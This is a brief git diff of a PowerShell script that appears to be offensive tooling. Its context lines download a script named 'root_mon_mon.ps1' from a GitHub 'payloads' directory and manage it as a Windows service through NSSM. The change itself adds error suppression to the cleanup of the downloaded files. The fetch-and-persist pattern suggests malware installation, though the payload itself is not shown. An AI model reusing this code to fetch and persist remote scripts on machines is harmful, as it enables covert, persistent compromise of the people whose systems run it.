@@ -39,8 +39,8 @@ if(-not(Test-Path -Path $scriptPath -PathType Leaf)){
     iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/root_mon_mon.ps1" -OutFile $scriptPath
 }
 
-Remove-Item -Path $downloadPath -Force -Recurse
-Remove-Item -Path "$env:temp\nssm-2.24" -Force -Recurse
+Remove-Item -Path $downloadPath -Force -Recurse -ErrorAction SilentlyContinue
+Remove-Item -Path "$env:temp\nssm-2.24" -Force -Recurse -ErrorAction SilentlyContinue
 
 if(Get-Service -Name $serviceName -ErrorAction SilentlyContinue){
     & $nssmexe stop $serviceName
